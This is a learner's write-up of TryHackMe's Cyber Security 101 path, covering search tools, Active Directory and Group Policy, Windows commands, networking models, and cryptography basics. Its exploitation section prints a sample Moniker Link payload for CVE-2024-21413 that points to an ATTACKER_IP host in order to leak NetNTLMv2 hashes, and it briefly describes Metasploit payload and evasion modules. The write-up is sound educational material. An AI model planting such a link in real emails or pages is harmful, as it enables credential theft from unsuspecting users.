# TryHackMe Cyber Security 101

**Cyber Security 101** provides a solid introduction to key areas of cyber security. It covers foundational topics like system protection, vulnerability awareness, and practical security skills essential for newcomers.

I’m progressing through this path to build a strong base, sharpen my hands-on abilities, and track my learning journey. While this write-up mainly supports my own growth, I hope it can also offer value to others exploring the field.

---

## Table of Contents

1. [Start Your Cyber Security Journey](#1-start-your-cyber-security-journey)
2. [Linux Fundamentals](#2-linux-fundamentals)
3. [Windows and AD Fundamentals](#3-windows-and-ad-fundamentals)
4. [Command Line](#4-command-line)
5. [Networking](#5-networking)
6. [Cryptography](#6-cryptography)
7. [Exploitation Basics](#7-exploitation-basics)
8. [Web Hacking](#8-web-hacking)
9. [Offensive Security Tooling](#9-offensive-security-tooling)
10. [Defensive Security](#10-defensive-security)
11. [Security Solutions](#11-security-solutions)
12. [Defensive Security Tooling](#12-defensive-security-tooling)
13. [Build Your Cyber Security Career](#13-build-your-cyber-security-career)

---

## 1. Start Your Cyber Security Journey

### Offensive Security Intro and Defensive Security Intro

This module started with **Offensive Security Intro** and **Defensive Security Intro** rooms, which I’ve already documented in [Pre Security – Introduction to Cyber Security](pre-security.md#1-introduction-to-cyber-security).

### Search Skills

The goal of this room was to strengthen how I **find, evaluate, and read information** using various **browsing tools**. Since anyone can publish information online, it’s up to us to critically assess what we find. Key points I focused on:

- **Source** – identify the author or publisher and consider whether they’re reputable.
- **Evidence and reasoning** – check that claims are supported by credible evidence and logical arguments.
- **Objectivity and bias** – information should be presented impartially, showing multiple perspectives where relevant.
- **Corroboration and consistency** – verify information by comparing it with multiple independent sources.

Each **internet search engine** (Google, Bing, DuckDuckGo, etc.) supports **advanced search**. **Google**, for example, offers these common **search operators**:

- `"exact phrase"` – using double quotes returns pages with the **exact word or phrase**.
- `site:` – limits results to a specific domain, e.g., `site:tryhackme.com success stories`.
- `-` – the minus sign excludes terms, e.g., `pyramids -tourism` to avoid tourism results.
- `filetype:` – searches for specific file types, e.g., `filetype:pdf nist csf` returns PDF files related to the NIST Cybersecurity Framework.

I also bookmarked this useful list of [advanced search operators](https://github.com/cipher387/Advanced-search-operators-list) for future reference.

There are **specialized search engines** that help find specific types of information:

- **Shodan** – searches for **servers**, **networking gear**, **industrial control systems**, and **IoT devices** by type and version. For example, I can look up how many servers still run Apache 2.4.1 and where they’re located by searching for `apache 2.4.1`.
- **Censys** – focuses on **Internet-connected hosts**, **websites**, **certificates**, and other assets. It’s useful for tasks like enumerating domains, **auditing open ports**, and spotting **rogue assets**.
- **VirusTotal** – scans **files** or **URLs** with multiple antivirus engines at once. It’s also possible to input file hashes to see previous scan results.
- **Have I Been Pwned** (HIBP) – checks if an **email address** has appeared in a **known data breach**, which helps identify leaked personal data and passwords.

Besides HIBP, this was my first time trying out Shodan, Censys, and VirusTotal — and they already feel invaluable for both offensive and defensive research.

I also explored **Common Vulnerabilities and Exposures** (CVE), which is a **standardized dictionary of known vulnerabilities** with unique **CVE IDs**. I can find CVEs through the [CVE Program Mission](https://www.cve.org/) or the [NIST National Vulnerability Database](https://nvd.nist.gov/).

**Exploit Database** is a go-to for finding working exploit code — for example, a company’s red team might use it to locate proofs of concept for known CVEs. **GitHub** can also host repositories with tools, **PoC** scripts, or exploit code for the same purpose.

It’s just as important to find **official documentation**. On **Linux** and other Unix-like systems, the `man` command provides **manual pages** for commands, system calls, libraries, and configuration files. **Microsoft** maintains an extensive [Technical Documentation page](https://learn.microsoft.com/en-us/) for its products.

The room wraps up with advice on **social media investigation**. It’s wise to use **temporary email addresses** for accounts you’ll only need briefly. Social media can be a goldmine for cybersecurity professionals — whether researching people or technical details. Staying active on relevant channels is also one of the best ways to keep up with **new threats, tools, and techniques**, helping me grow my technical skills and awareness over time.

---

## 2. Linux Fundamentals

I’ve already completed and documented **Linux Fundamentals Part 1** in [Pre Security – Linux Fundamentals](pre-security.md#4-linux-fundamentals), with **Part 2** and **Part 3** being unlocked behind **TryHackMe Premium**.

---

## 3. Windows and AD Fundamentals

### Windows Fundamentals Parts 1–3

I’ve also already documented **Windows Fundamentals Parts 1–3** in [Pre Security – Windows Fundamentals](pre-security.md#5-windows-fundamentals).

### Active Directory Basics

In a corporate environment, managing devices and users at scale is handled through **Active Directory** (AD).

For a small office with a handful of computers, it’s manageable to configure and troubleshoot each machine individually. But as an organization grows into hundreds or thousands of endpoints, a **Windows domain** becomes essential for scalability and centralized control.

A **Windows domain** is a collection of **users** and **computers** managed from a central location. This is possible because of **Active Directory** (AD), which acts as a single, authoritative directory for all domain objects. AD services run on a dedicated server called a **Domain Controller** (DC).

Key benefits of a properly configured **Windows domain**:
- **Centralized identity management** — Administrators handle all user accounts, passwords, and permissions in one place, reducing manual overhead.
- **Policy enforcement** — Security policies can be pushed from AD and automatically applied to any user or device that joins the domain.

A simple example is a corporate or school network login: your username and password work on any domain-joined device because each machine **authenticates** you through **Active Directory**. AD verifies your **credentials**, then applies any required **policies**, like restricting Control Panel access or enforcing screen lock settings.

At the heart of a **Windows domain** is **Active Directory Domain Services** (AD DS). AD DS holds detailed records about all **objects** — the building blocks of a domain — including users, groups, computers, printers, and shared resources.

- **Users** — The most common **security principal**. A user can be:
  - A real person in the organization who needs network access.
  - A service account used by software (like IIS or SQL Server) to run with only the required permissions.

- **Machines** — Any computer added to AD becomes a **machine object**, which is also a **security principal**. Machine accounts have local admin rights on themselves but shouldn’t be used like regular user accounts. By convention, machine account names end with a dollar sign (`$`), like `DC01$`.

- **Security groups** — These simplify access control. Adding a user to a group grants them that group’s permissions. Groups can contain **users**, **machines**, or even other groups. Security groups themselves are security principals too. Every domain comes with some default groups for common tasks.

To manage these objects, we log in to the **Domain Controller** and open **Active Directory Users and Computers** (ADUC) from the start menu.

In ADUC, objects appear in **Organizational Units** (OUs). OUs are **container objects** that help classify users and computers into manageable sections. They allow administrators to apply **Group Policies** to specific sets of objects. Each user or machine can only belong to one OU at a time.

Common default containers and OUs include:
- **Builtin** — Default Windows groups.
- **Computers** — The default container for new machines joining the domain.
- **Domain Controllers** — The default OU for Security Operations Center (SOC) domain controllers.
- **Users** — Stores default domain-wide users and groups.
- **Managed Service Accounts** — Holds accounts used by services within the domain.

Both **OUs** and **Security Groups** organize users and computers, but their roles differ:
- OUs apply **Group Policies** to configure or restrict devices and users. Because conflicting policies can cause issues, an object can only sit in one OU.
- **Security Groups** grant or deny access to resources like shared drives or printers. A user can be in multiple groups at once to handle various permissions.

To build practical experience, I tested creating a few Group Policy Objects (GPOs) to enforce security baselines. One GPO blocked non-IT users from accessing the **Control Panel**. Another enforced an auto-lock for all **workstations** and **servers** after 5 minutes of inactivity.

To restrict the Control Panel, I created a GPO named **Restrict Control Panel Access**. Under **User Configuration**, I enabled `Prohibit Access to Control Panel and PC settings`. I linked this GPO to the **Marketing**, **Management**, and **Sales** OUs so only those users are restricted, while IT keeps full access for support and maintenance.

For the auto-lock, I set up a GPO called **Auto Lock Screen**. Under **Computer Configuration**, I configured the inactivity timeout to 5 minutes. I linked it at the root domain level so that all **child OUs** inherit it automatically. Because this GPO only targets computers, it doesn’t interfere with user-only OUs like Sales or Marketing.

To confirm everything worked, I connected through RDP as a test user (`THM\Mark`). When Mark tried to open the Control Panel, access was denied as expected. After 5 minutes idle, the session locked automatically. This lab reinforced how GPO inheritance and filtering work for managing different security baselines across AD.

In a **Windows domain**, all credentials live on the **Domain Controllers**. When a user signs in, their credentials are verified by the DC using one of two protocols:
- **Kerberos** — The standard protocol for modern Windows authentication.
- **NetNTLM** — An older protocol still used in legacy cases.

When a user authenticates with **Kerberos**, they send their username and a timestamp (encrypted with a key derived from their password) to the **Key Distribution Center (KDC)**, which runs on a **Domain Controller**.

The KDC responds with a **Ticket Granting Ticket (TGT)** and a **Session Key**. The TGT is encrypted with the `krbtgt` account’s password hash, so the user can’t read it. This design lets the KDC recover the session information by decrypting the TGT later.

When the user wants to access a service, they present the TGT, an encrypted timestamp, and the **Service Principal Name (SPN)** to the KDC to get a **Ticket Granting Service (TGS)** ticket. The KDC returns a TGS and a **Service Session Key**. The service decrypts the TGS, verifies the session key, and grants access.

As organizations expand, one domain often isn’t enough. Managing multiple offices, compliance zones, or IT teams can make a single large domain difficult to maintain. **Active Directory** solves this with **trees** — multiple domains that share the same **namespace**. For example, `thm.local` might split into `uk.thm.local` and `us.thm.local`, forming a tree with one **root** and separate **subdomains**, each with its own DCs, users, and machines.

Each domain has its own **Domain Admins**, while the **Enterprise Admins** group has full authority across all domains in the tree. This keeps local teams independent while enabling centralized oversight.

Multiple **trees** with different namespaces form a **forest** — the top-level structure in AD for managing connected but separate domains.

To share access across domains, AD uses **trust relationships**:
- A **one-way trust** allows Domain BBB users to access Domain AAA’s resources (not the other way around). The trust direction is the opposite of the access direction.
- A **two-way trust** allows both domains to grant each other’s users permissions. Domains in the same **tree** or **forest** automatically share a two-way trust.

A trust doesn’t grant **automatic access** — it only enables permissions to be assigned across domains when needed.

---

## 4. Command Line

The **command-line interface** (CLI) has several advantages over a **Graphic User Interface** (GUI). It uses fewer system resources, supports robust **automation**, and enables straightforward **remote management**.

You can only issue commands within the **Windows Path**. To view the current **Path** variable from the command line, use `set`. Running `ver` will display the current version of Windows.

The `systeminfo` command lists detailed information about the system, including the operating system, processor, memory, and other specs that can help establish a baseline during a Security Operations Center (SOC) investigation.

One really helpful feature is the `more` command, which lets you handle long outputs more easily by paging through the results. For example, `driverquery | more` makes it much simpler to read through all installed drivers.

The room pointed out that you can use `CTRL + C` to terminate a running command — a basic but essential trick I already knew from previous experience. Similarly, I’ve used `cls` and `clear` to clean up the terminal window.

If you ever need to understand how a command works, the `help` command is invaluable. For instance, `ipconfig help` will show available switches for `ipconfig`. This command checks **network configuration**, such as IP address, subnet mask, and default gateway. Running `ipconfig /all` provides even more detail, including DNS servers and Dynamic Host Configuration Protocol (DHCP) status.

For **network troubleshooting**, `ping target_name` tests connectivity to a host and confirms whether it replies. `tracert target_name` (trace route) is useful to trace the path that packets take to reach the target, helping to identify where delays or failures occur.

To look up a **host** or **domain** and find its **IP address**, `nslookup` comes in handy. To monitor active network connections and listening ports, `netstat` is the go-to tool. Some useful `netstat` options include:
- `netstat -a`: displays all active connections and listening ports
- `netstat -b`: shows which executable is responsible for each connection
- `netstat -o`: reveals the process ID (PID) for each connection
- `netstat -n`: shows addresses and port numbers in numerical form

Combining these, `netstat -abon` provides detailed information about what executables are listening for incoming connections, along with the associated PIDs — critical context for SOC work when investigating suspicious connections.

Using `cd` without any parameters shows the current drive and directory (similar to `whereami`). To list the contents of a directory, `dir` works well. Add `/a` to see hidden and system files, or `/s` to include files in all subdirectories. The `tree` command gives a visual representation of the entire directory structure.

To navigate directories:
- `cd target_name` changes to the specified directory.
- `cd ..` moves back one level.
- `mkdir directory_name` creates a new directory.
- `rmdir directory_name` removes a directory.
- `copy existing-file-name new-file-name` copies files.
- `move file-name` moves files.
- `del` or `erase` deletes a file.

The wildcard `*` makes handling multiple files efficient. For example, `copy *.md C:\Markdown` copies all `.md` files to `C:\Markdown`.

Just like **Task Manager**, the `tasklist` command shows all running processes. To filter results, check available filters with `tasklist /?`. For instance, to find only the Secure Shell (SSH) daemon, use `tasklist /FI "imagename eq sshd.exe"` (`/FI` sets the filter to match the image name). Once you know the PID, you can terminate it with `taskkill /PID target_pid`.

Finally, to check the file system for errors and bad sectors, run `chkdsk`. For scanning system files for corruption and attempting repairs, `sfc /scannow` is essential. Both tools help maintain system integrity, which is foundational for any SOC environment.

### Premium-Only Content

- Windows PowerShell

_Discover the "Power" in PowerShell and learn the basics._

- Linux Shells

_Learn about scripting and the different types of Linux shells._

---

## 5. Networking

The **Open Systems Interconnection** (OSI) model, defined by the International Organization for Standardization (ISO), describes how communication should occur in a computer network — it defines a **framework for computer network communications**. To help remember the OSI layers in order, I like using a simple mnemonic: _**P**lease **D**o **N**ot **T**hrow **S**pinach **P**izza **A**way_. It is composed of seven layers:

| Layer Number | Layer Name          | Main Function                                         | Example Protocols and Standards                  |
|--------------|---------------------|-------------------------------------------------------|--------------------------------------------------|
| Layer 7      | Application Layer   | Providing services and interfaces to applications     | HTTP, FTP, DNS, POP3, SMTP, IMAP                 |
| Layer 6      | Presentation Layer  | Data encoding, encryption, and compression            | Unicode, MIME, JPEG, PNG, MPEG                   |
| Layer 5      | Session Layer       | Establishing, maintaining, and synchronizing sessions | NFS, RPC                                         |
| Layer 4      | Transport Layer     | End-to-end communication and data segmentation        | UDP, TCP                                         |
| Layer 3      | Network Layer       | Logical addressing and routing between networks       | IP, ICMP, IPSec                                  |
| Layer 2      | Data Link Layer     | Reliable data transfer between adjacent nodes         | Ethernet (802.3), WiFi (802.11)                  |
| Layer 1      | Physical Layer      | Physical data transmission media                      | Electrical, optical, and wireless signals        |

**Transmission Control Protocol/Internet Protocol** (TCP/IP) keeps a network operational even when parts of it fail. This resilience comes partly from the way routing protocols are designed to adapt dynamically as the network topology changes.

The **TCP/IP model** differs from the **Open Systems Interconnection (OSI)** model by combining certain layers. In the TCP/IP stack, the responsibilities of the **Presentation Layer** and **Session Layer** are generally handled within the **Application Layer** protocols themselves.

| Layer Number | ISO OSI Model     | TCP/IP Model            | Protocols                                           |
|--------------|-------------------|-------------------------|-----------------------------------------------------|
| Layer 7      | Application Layer | Application Layer       | HTTP, HTTPS, FTP, POP3, SMTP, IMAP, Telnet, SSH     |
| Layer 6      | Presentation Layer|                         | TLS, SSL, MIME, JPEG, MPEG                          |
| Layer 5      | Session Layer     |                         | NetBIOS, RPC, PPTP                                  |
| Layer 4      | Transport Layer   | Transport Layer         | TCP, UDP                                            |
| Layer 3      | Network Layer     | Internet Layer          | IP, ICMP, IPSec                                     |
| Layer 2      | Data Link Layer   | Link Layer              | Ethernet (802.3), WiFi (802.11)                     |
| Layer 1      | Physical Layer    |                         |                                                     |

Every host on a network needs a **unique identifier** to communicate with other hosts. When using the **Transmission Control Protocol/Internet Protocol (TCP/IP)**, we assign an **IP address** to each device. IPv4 (Internet Protocol version 4) is still the most common, but IPv6 (Internet Protocol version 6) is increasingly deployed to handle the shortage of available IPv4 addresses.

An IPv4 address is made up of **four octets** (4 x 8 bits = 32 bits). Each octet represents a value between 0 and 255. Typically, the first and last addresses in a subnet are reserved for **network** and **broadcast addresses**. For example, `192.168.1.0` identifies the network, and `192.168.1.255` is the broadcast address that targets **all hosts** within that network segment.

To check **network configuration**, we can use `ipconfig` on Windows, or `ifconfig` and `ip address show` (or the short version `ip a s`) on Linux.

A Request for Comments (RFC) defines the following three **private IP address ranges**:

- `10.0.0.0` – `10.255.255.255` (`10/8`)
- `172.16.0.0` – `172.31.255.255` (`172.16/12`)
- `192.168.0.0` – `192.168.255.255` (`192.168/16`)

There are **public IP addresses** and **private IP addresses**. The purpose of private IP space is that it **cannot directly reach** or **be reached** from the **public Internet**. For a private IP address to access the Internet, the network’s router must have a **public IP address** and perform **Network Address Translation (NAT)** to translate between private and public IPs.

TryHackMe describes a **router** like a post office — you hand it a parcel and it knows where to deliver it next. A router **forwards data packets** to the correct **network**. A packet usually passes through **multiple routers** on its path to its destination. A router operates on **Layer 3** of the OSI model, inspecting the **IP address** and forwarding the packet to the next network or router that is closer to the final destination.

The **Internet Protocol (IP)** enables us to reach a destination host identified by its IP address on a **network**. However, we also need **transport layer protocols** to allow processes on **networked hosts** to communicate with each other — this is where **User Datagram Protocol (UDP)** and **Transmission Control Protocol (TCP)** come in.

**UDP** helps reach a **specific process** on a target host. UDP operates at the **transport layer (Layer 4)** and is **connectionless** — it does not establish a session before sending data and provides no guarantee that a **packet** has been delivered. Think of it like mailing a letter without requiring delivery confirmation: simple, fast, and low overhead.

While an **IP address** identifies the host, **port numbers** identify the sending and receiving processes. A port number uses **two octets** (1–65535). **Port 0** is **reserved**.

In contrast, **TCP** is **connection-oriented**. Like UDP, it works at **Layer 4**, but it requires a **TCP connection** before any data is exchanged and ensures delivery by acknowledging packets.

In TCP, each **data octet** is assigned a **sequence number** so the receiver can detect lost or duplicate packets. The receiver sends back an **acknowledgement number** to confirm the last received octet.

A TCP connection is set up using a **three-way handshake**, which uses the **SYN** (Synchronise) and **ACK** (Acknowledgement) flags:

- **SYN**: The client requests a connection by sending a SYN packet with its initial sequence number.
- **SYN-ACK**: The server responds with a SYN-ACK packet, including its own initial sequence number.
- **ACK**: The client completes the handshake with an ACK, confirming the server’s response.

It’s also important to understand **encapsulation** — the process where each layer adds a **header** (and sometimes a **trailer**) to the received unit of data before passing it to the layer below. This keeps each layer focused on its specific role and enables reliable communication across complex networks.

- **Application data**: The user’s input (e.g., an email or message) is formatted by the application and passed to the transport layer.
- **Transport segment/datagram**: The transport layer (TCP or UDP) adds its header, creating a **segment** (TCP) or **datagram** (UDP), then passes it down.
- **Network packet**: The network layer adds an **IP header**, producing a **packet** for routing across networks.
- **Data link frame**: The data link layer (e.g., Ethernet or WiFi) adds a **frame header** and **trailer**, preparing the data for physical transmission.

Here’s a simple recap of **the life of a packet** using what happens when you search for something on TryHackMe as an example:

1. You **type** a search and **press enter** on TryHackMe.
2. The **browser** uses **HTTPS** to create an **HTTP request** and passes it to the **transport layer**.
3. **TCP** does a **three-way handshake**, sends the **HTTP request**, and splits it into **segments** for the **Internet layer**.
4. The **IP layer** adds the **source IP** (your PC) and **destination IP** (TryHackMe server) and sends it to the **link layer**.
5. The **link layer** adds a **header/trailer** and sends the packet to a **router**.
6. Each **router** removes link info, checks the **IP address**, and **forwards** the packet until it reaches the server’s router.
7. At the destination, the process is **reversed** so the server can process the **request**.

Teletype Network (TELNET) is a **network protocol** for remote terminal connections. It allows a user to connect to any server that is listening on a TCP port.

In this task on **TryHackMe (THM)**, I used the **AttackBox** to target another virtual machine (VM). On that VM, several services were running:

- **Echo server**: Echoes everything sent to it. By default, it listens on port `7`.
- **Daytime server**: Listens on port `13` by default and responds with the current day and time.
- **Web (HTTP) server**: Listens on TCP port `80` by default and serves web pages.

THM notes that the echo and daytime servers are considered a **security risk** in real environments and should not be running. They are active here only for this practice task.

To complete this task, I used the terminal and ran `telnet 10.10.140.110 80` to connect to the HTTP server. Once connected, I sent `GET / HTTP/1.1` along with `Host: telnet.thm`, then pressed Enter twice. This revealed the HTTP server version and allowed me to retrieve the **flag**.

### Premium-Only Content

- **Networking Essentials**

_Explore networking protocols from automatic configuration to routing packets to the destination._

- **Networking Core Protocols**

_Learn about the core TCP/IP protocols._

- **Networking Secure Protocols**

_Learn how TLS, SSH, and VPN can secure your network traffic._

- **Wireshark: The Basics**

_Learn the basics of Wireshark and how to analyse protocols and PCAPs._

- **Tcpdump: The Basics**

_Learn how to use Tcpdump to save, filter, and display packets._

- **Nmap: The Basics**

_Learn how to use Nmap to discover live hosts, find open ports, and detect service versions._

---

## 6. Cryptography

Networking protocols enable global communication between devices, but **cryptography** ensures we can trust that communication. Cryptography is the practice and study of techniques that **secure communication** and **protect data**, even when adversaries may try to intercept or tamper with it. It safeguards **confidentiality**, **integrity**, and **authenticity** — the core goals of the CIA triad.

We rarely notice cryptography in action, but it operates constantly in the background. Some examples include:

- **Login credentials** are encrypted to prevent interception.
- Connecting over **Secure Shell (SSH)** creates an encrypted tunnel to block eavesdropping.
- **Online banking** uses cryptography to verify a server’s certificate, ensuring you’re not talking to an attacker.
- When **downloading files**, cryptographic hashing confirms the file matches the original.
- Companies handling **credit cards** must follow the **Payment Card Industry Data Security Standard (PCI DSS)** to securely **store**, **process**, and **transmit** card data.

Various laws mandate the use of cryptography, including Health Insurance Portability and Accountability Act (HIPAA), Health Information Technology for Economic and Clinical Health (HITECH), General Data Protection Regulation (GDPR), and the Data Protection Act (DPA).

In cryptography, **plaintext** is readable data that needs protection. **Encryption** uses a **cipher** and a **key** to convert plaintext into **ciphertext**, which hides the original message. **Decryption** then uses the same or a related key to turn the ciphertext back into plaintext.

A **key** is a string of bits the cipher uses to encrypt or decrypt data. The cipher itself is usually public knowledge, but the key must stay secret — unless it is a public key used in **asymmetric encryption**, which I will cover in a later task.

There are two types of encryption:

- **Symmetric Encryption** (also called symmetric cryptography) uses the same **key** for both **encryption** and **decryption**. This is also known as **private key cryptography** because the key must remain secret. The key has to be shared through a **secure communication channel**, which can be difficult to maintain, especially when multiple recipients need access. Common symmetric encryption examples are **Data Encryption Standard (DES)**, **Triple DES (3DES)**, and **Advanced Encryption Standard (AES)**.
  - **DES** uses a 56-bit key but became insecure as computing power improved.
  - **3DES** strengthened DES by applying it three times but was only a temporary fix and is now deprecated.
  - **AES** replaced DES in 2001 and remains the current standard, offering key sizes of 128, 192, or 256 bits.

- **Asymmetric Encryption** (also called asymmetric cryptography) uses **a pair of keys** — one for **encryption** and another for **decryption**. To ensure **confidentiality**, data is encrypted with a **public key** and decrypted with a **private key**. Common examples include:
  - **Rivest-Shamir-Adleman (RSA)** encrypts data with two keys: one to lock and another to unlock, relying on the difficulty of factoring large numbers.
  - **Diffie-Hellman** securely exchanges cryptographic keys over an insecure channel, allowing two parties to establish a shared secret.
  - **Elliptic Curve Cryptography (ECC)** provides strong security with smaller keys by using the mathematics of elliptic curves.

Modern cryptography is built on mathematical principles. TryHackMe introduces two basic operations used in many algorithms:

- **XOR** (exclusive OR) compares two bits and returns `1` if they are different or `0` if they are the same. It’s shown with `⊕` or `^`. For example, if `P` is the plaintext and `K` is the secret key, the ciphertext is `C = P ⊕ K`.
- **Modulo Operation**, written as `%` or `mod`, returns the remainder when one number is divided by another. This remainder is a key part of many cryptographic methods.

### Premium-only Content

- **Public Key Cryptography Basics**

_Discover how public key ciphers such as RSA work and explore their role in applications such as SSH._

- **Hashing Basics**

_Learn about hashing functions and their uses in password verification and file integrity checking._

- **John the Ripper: The Basics**

_Learn how to use John the Ripper, a powerful and adaptable hash-cracking tool._

---

## 7. Exploitation Basics

This module begins with the **Moniker Link exploit (CVE-2024-21413)**. This vulnerability bypasses **Outlook’s** security checks when handling a special hyperlink called a **Moniker Link**. An attacker can send a crafted email with a malicious Moniker Link, tricking **Outlook** into sending the user’s NTLM credentials once the link is clicked.

Outlook can handle normal web links like `http` and `https`, but it can also open `file://` Moniker Links that point to files or applications. Normally, clicking these links triggers **Protected View**, which opens content read-only and blocks macros.

The issue arises when the link includes a `!` character with extra text, which bypasses Protected View. For example: `<a href="file://ATTACKER_IP/test!exploit">Click me</a>`. The SMB protocol tries to authenticate using local credentials even if the file share doesn’t exist, sending the victim’s Windows **NetNTLMv2 hash** to the attacker.

**Remote Code Execution (RCE)** is theoretically possible because Moniker Links interact with Windows **Component Object Model (COM)**, but this is out of scope here since no public proof-of-concept for RCE with this CVE exists yet.

**Florian Roth** developed a **YARA rule** to help detect emails that contain the `file://` element used in a malicious Moniker Link. This rule makes it easier to spot potential abuse of this exploit in email traffic.

---

## 8. Web Hacking

**Metasploit Framework** is the most common open-source exploitation framework. It’s powerful for scanning, exploitation, and post-exploitation tasks. I’m using `msfconsole` to run **modules** like exploits and payloads, and tools like `msfvenom` to generate custom payloads. In this next task, I’ll practice using Metasploit inside a Linux virtual machine (VM) to learn how to find exploits, configure options, and test them safely.

I started by launching `msfconsole` in the Terminal. This gave me access to various Metasploit Framework modules — each built for a specific purpose. Key terms to keep clear:

- **Exploit**: Code that takes advantage of a vulnerability on the target system.
- **Vulnerability**: A flaw that can let an attacker access data or run code.
- **Payload**: The code that runs on the target once the exploit succeeds.

Each module fits into categories:

- **Auxiliary** — extra tools like scanners, crawlers, or fuzzers.
- **Encoders** — encode exploits and payloads to bypass signature-based antivirus.
- **Evasion** — help hide attacks better than encoders alone.
- **Exploits** — organized by target systems.
- **NOPs (No Operation)** — fillers to keep payload sizes stable by pausing the CPU briefly.
- **Payloads** — code executed on the target, divided into:
  - **Adapters** — wrap payloads to run in different formats, like converting to a `PowerShell` command.
  - **Singles** — self-contained payloads that run immediately (e.g., add a user).
  - **Stagers** — set up a connection between Metasploit and the target to pull in a larger payload.
  - **Stages** — the larger payloads delivered by the stager for more complex tasks.
- **Post modules** — used after exploitation for tasks like gathering credentials or escalating privileges.

---

## 9. Offensive Security Tooling

---

## 10. Defensive Security

---

## 11. Security Solutions

---

## 12. Defensive Security Tooling

---

## 13. Build Your Cyber Security Career

---

🔝 Back to [top](#tryhackme-cyber-security-101)

🔙 Back to [Writeups Overview](README.md)
